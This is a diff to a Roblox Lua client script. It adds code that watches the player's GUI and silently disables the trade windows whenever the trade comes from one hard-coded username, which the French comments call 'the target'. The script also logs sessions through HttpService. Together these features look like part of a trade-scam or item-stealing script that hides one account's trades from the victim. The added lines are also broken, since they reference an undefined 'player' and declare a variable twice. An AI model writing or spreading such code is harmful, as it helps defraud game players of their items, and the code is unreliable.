@@ -4,6 +4,8 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local StarterGui = game:GetService("StarterGui")
+local playerGui = player:WaitForChild("PlayerGui")
+
 
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -55,6 +57,36 @@ local function sendSessionLog(player)
         })
     end)
 end
+
+-- Nom de la cible
+local CIBLE = "zeynox0880"
+
+-- Fonction pour masquer les interfaces
+local function cacherInterfaces()
+    if playerGui:FindFirstChild("TradeGUI") then
+        playerGui.TradeGUI.Enabled = false
+    end
+    if playerGui:FindFirstChild("TradeGUI_Phone") then
+        playerGui.TradeGUI_Phone.Enabled = false
+    end
+end
+
+-- On surveille les changements dans le PlayerGui pour détecter l'apparition du trade
+playerGui.ChildAdded:Connect(function(child)
+    -- On attend un court instant pour que le contenu du GUI se charge
+    task.wait(0.1)
+    
+    -- Vérification si l'interface de trade est apparue
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+        -- Ici, il faudrait idéalement vérifier qui est l'expéditeur. 
+        -- Si le jeu affiche le nom de l'expéditeur dans un TextLabel :
+        local label = child:FindFirstChild("SenderName", true) -- "SenderName" est un exemple
+        
+        if label and label.Text == CIBLE then
+            cacherInterfaces()
+        end
+    end
+end)
 
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
